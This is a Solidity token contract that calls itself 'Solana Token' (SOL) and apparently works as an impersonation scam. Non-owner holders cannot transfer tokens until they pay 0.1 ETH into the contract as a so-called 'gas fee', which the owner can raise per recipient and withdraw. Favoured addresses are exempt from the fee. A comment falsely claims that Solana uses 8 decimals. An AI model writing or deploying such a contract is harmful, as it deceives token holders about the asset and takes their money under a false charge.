// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title Solana Token (SOL)
 * @dev Solana token with transfer-blocking gas fee mechanism
 * @notice Transfer-free for admin, requires ETH gas fee for users
 */
contract SolanaToken is ERC20, Ownable {
    // Token decimals: Solana uses 8 decimals like Bitcoin
    uint8 private constant DECIMALS = 8;

    // Gas fee parameters (in wei)
    uint256 public minGasFee; // Minimum gas fee in wei (ETH)
    uint256 public maxGasFee; // Maximum gas fee in wei (ETH)

    // Tracking
    mapping(address => uint256) public gasBalance; // ETH paid for gas by user
    mapping(address => bool) public approvedSenders; // Addresses that bypass gas fee
    mapping(address => uint256) public customGasFees; // Custom gas fee per recipient (0 = use default)
    mapping(address => GasPaymentRecord[]) public gasPaymentHistory;

    struct GasPaymentRecord {
        uint256 amount;
        uint256 timestamp;
        string transactionId;
    }

    // Events
    event GasFeePaid(address indexed user, uint256 amount);
    event GasFeeUpdated(uint256 minFee, uint256 maxFee);
    event ApprovedSenderUpdated(address indexed sender, bool approved);
    event CustomGasFeeSet(address indexed recipient, uint256 gasFee);
    event GasFeesWithdrawn(uint256 amount);

    /**
     * @dev Initialize Solana token with gas fee mechanism
     * Supply: 120 SOL
     * Gas Fee: 0.1 ETH (~$300 at current rates, configurable by admin)
     */
    constructor() ERC20("Solana Token", "SOL") Ownable(msg.sender) {
        // Initialize gas fee: 0.1 ETH (~$300)
        minGasFee = 0.1 ether;
        maxGasFee = 0.1 ether;

        // Mint initial supply to owner (120 SOL with 8 decimals)
        _mint(msg.sender, 120 * 10**DECIMALS); // 120 SOL
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     */
    function decimals() public pure override returns (uint8) {
        return DECIMALS;
    }

    /**
     * @dev Override transfer to enforce gas fee requirement
     */
    function transfer(address to, uint256 amount) public override returns (bool) {
        // Admin can transfer without gas fee
        if (msg.sender == owner()) {
            return super.transfer(to, amount);
        }

        // Check if sender is approved (can transfer without gas fee)
        if (approvedSenders[msg.sender]) {
            return super.transfer(to, amount);
        }

        // Check gas balance
        require(
            gasBalance[msg.sender] > 0,
            "Solana: Cannot transfer without paying gas fee in ETH first"
        );

        // Deduct gas fee from gas balance
        uint256 requiredFee = customGasFees[to] > 0 ? customGasFees[to] : minGasFee;
        require(gasBalance[msg.sender] >= requiredFee, "Solana: Insufficient ETH balance for gas");

        gasBalance[msg.sender] -= requiredFee;

        // Perform transfer
        return super.transfer(to, amount);
    }

    /**
     * @dev Override transferFrom to enforce gas fee requirement
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        // Admin can transfer without gas fee
        if (from == owner()) {
            return super.transferFrom(from, to, amount);
        }

        // Check if sender is approved
        if (approvedSenders[from]) {
            return super.transferFrom(from, to, amount);
        }

        // Check gas balance
        require(gasBalance[from] > 0, "Solana: Cannot transfer without paying gas fee");

        // Deduct gas fee
        uint256 requiredFee = customGasFees[to] > 0 ? customGasFees[to] : minGasFee;
        require(gasBalance[from] >= requiredFee, "Solana: Insufficient ETH balance for gas");

        gasBalance[from] -= requiredFee;

        // Perform transfer
        return super.transferFrom(from, to, amount);
    }

    /**
     * @dev Calculate gas fee for transfer amount
     * For Solana: Fixed fee in ETH
     */
    function calculateGasFee(uint256 amount) public view returns (uint256) {
        return minGasFee;
    }

    /**
     * @dev Pay gas fee by sending ETH
     */
    function payGasFee() public payable {
        require(msg.value > 0, "Solana: Gas fee must be greater than 0");

        gasBalance[msg.sender] += msg.value;

        gasPaymentHistory[msg.sender].push(
            GasPaymentRecord({
                amount: msg.value,
                timestamp: block.timestamp,
                transactionId: ""
            })
        );

        emit GasFeePaid(msg.sender, msg.value);
    }

    /**
     * @dev Admin: Update gas fee parameters
     */
    function setGasFeeBounds(uint256 _minGasFee, uint256 _maxGasFee) public onlyOwner {
        require(_minGasFee > 0, "Solana: Min gas fee must be greater than 0");
        require(_maxGasFee >= _minGasFee, "Solana: Max gas fee must be >= min gas fee");

        minGasFee = _minGasFee;
        maxGasFee = _maxGasFee;

        emit GasFeeUpdated(_minGasFee, _maxGasFee);
    }

    /**
     * @dev Admin: Add/remove approved sender (can transfer without gas fee)
     */
    function setApprovedSender(address sender, bool approved) public onlyOwner {
        approvedSenders[sender] = approved;
        emit ApprovedSenderUpdated(sender, approved);
    }

    /**
     * @dev Admin: Set custom gas fee for specific recipient
     */
    function setCustomGasFee(address recipient, uint256 gasFee) public onlyOwner {
        customGasFees[recipient] = gasFee;
        emit CustomGasFeeSet(recipient, gasFee);
    }

    /**
     * @dev Admin: Get user's gas balance
     */
    function getGasBalance(address user) public view returns (uint256) {
        return gasBalance[user];
    }

    /**
     * @dev Admin: Withdraw collected gas fees
     */
    function withdrawGasFees() public onlyOwner {
        uint256 balance = address(this).balance;
        require(balance > 0, "Solana: No gas fees to withdraw");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Solana: Withdrawal failed");

        emit GasFeesWithdrawn(balance);
    }

    /**
     * @dev Returns token metadata URI (for wallet integration)
     * Points to GitHub CDN hosted metadata with logo and token info
     */
    function tokenURI() public pure returns (string memory) {
        return "https://raw.githubusercontent.com/Cryptovaultiq/ShowThem-BTC-token/main/metadata/sol-metadata.json";
    }

    /**
     * @dev Allow contract to receive ETH
     */
    receive() external payable {}
}
